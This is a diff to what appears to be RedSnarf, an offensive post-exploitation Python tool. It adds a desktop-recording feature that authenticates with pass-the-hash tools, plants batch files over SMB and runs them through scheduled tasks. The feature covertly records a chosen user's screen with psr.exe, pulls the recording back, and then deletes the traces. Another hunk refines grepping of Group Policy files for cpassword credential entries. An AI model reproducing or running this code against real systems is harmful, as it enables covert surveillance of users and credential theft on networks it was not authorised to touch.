@@ -1461,8 +1461,9 @@ p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optio
 p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
 p.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
 p.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
-p.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
+p.add_argument("-eR", "--recorddesktop", dest="recorddesktop", default="n", help="<Optional> Record the console desktop")
 p.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help="<Optional> Take a screenshot of remote machine desktop")
+p.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
 # Registry related
 p.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
 p.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
@@ -1523,6 +1524,7 @@ edq_SingleSessionPerUser=args.edq_SingleSessionPerUser
 screenshot=args.screenshot
 unattend=args.unattend
 user_desc=args.user_desc
+recorddesktop=args.recorddesktop
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1566,6 +1568,75 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
+if recorddesktop in yesanswers:
+	if len(targets)==1:
+		try:			
+			print colored("[+]Starting Screen Recording:\n",'green')
+			
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")
+
+			usr_response = raw_input("\nPlease enter the username whose desktop you wish to record : ")
+			if usr_response !="":
+
+				fout=open('/tmp/srecordstart.bat','w')
+				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_ScreenRecord" /TR "psr.exe /start /gui 0 /output C:\\windows\\temp\\OUTPUT.zip" /ST 23:36 /f\n')
+				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecord" \n')
+				fout.close() 
+					
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstart.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstart.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+				
+			response = raw_input("\nEnter Y to stop recording : ")
+			if response in yesanswers:
+
+				fout=open('/tmp/srecordstop.bat','w')
+				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_ScreenRecordStop" /TR "psr.exe /stop" /ST 23:36 /f\n')
+				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecordStop" \n')
+				fout.close() 
+					
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+
+
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get OUTPUT.zip"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+					
+				if os.path.isfile(outputpath+targets[0]+"/"+"OUTPUT.zip"):
+					print colored("[+]Recording file saved as "+outputpath+targets[0]+"/"+"OUTPUT.zip",'yellow')
+				else:
+					print colored("[-]Recording not found, try again..",'red')
+
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\windows\\temp\\"+"OUTPUT.zip\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordstop.bat c:\\srecordstop.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+			
+				time.sleep(4)
+
+				fout=open('/tmp/srecordtidyup.bat','w')
+				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecord" /f\n')
+				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecordStop" /f')
+				fout.close() 
+
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordtidyup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordtidyup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]					
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordtidyup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+
+				time.sleep(4)
+
+			sys.exit()
+			
+		except OSError:
+			print colored("[-]Something went wrong recording the desktop",'red')
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 if golden_ticket in yesanswers:
 	if len(targets)==1:
@@ -2275,7 +2346,7 @@ if policiesscripts_dump in yesanswers:
 					#Grep cpassword entries out to file
 					os.system("grep --exclude=cpassword.txt -ri \"cpassword\" > cpassword.txt")
 					#Check to see if cpassword file has been created
-					if os.path.isfile(outputpath+targets[0]+'/Policies/cpassword.txt'):
+					if os.path.isfile(outputpath+targets[0]+'/Policies/cpassword.txt') and os.stat(outputpath+targets[0]+'/Policies/cpassword.txt').st_size >0:
 						#If file is available parse it
 						print colored("[+]Excellent we have found cpassword in Policies... "+outputpath+targets[0]+'/Policies/','green')
 						print colored("[+]Items containing cpassword have been output to "+outputpath+targets[0]+'/Policies/cpassword.txt','blue')
@@ -2316,7 +2387,7 @@ if policiesscripts_dump in yesanswers:
 					os.system("grep --color='auto' -ri pwd")
 					os.system("grep --color='auto' -ri runas")
 
-					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt'):
+					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt') and os.stat(outputpath+targets[0]+'/scripts/netuser.txt').st_size >0:
 							#If file is available parse it
 						print colored("[+]Excellent we have found \'net user\' in scripts... "+outputpath+targets[0]+'/scripts/','green')
 						print colored("[+]Items containing net user have been output to "+outputpath+targets[0]+'/scripts/netuser.txt','blue')
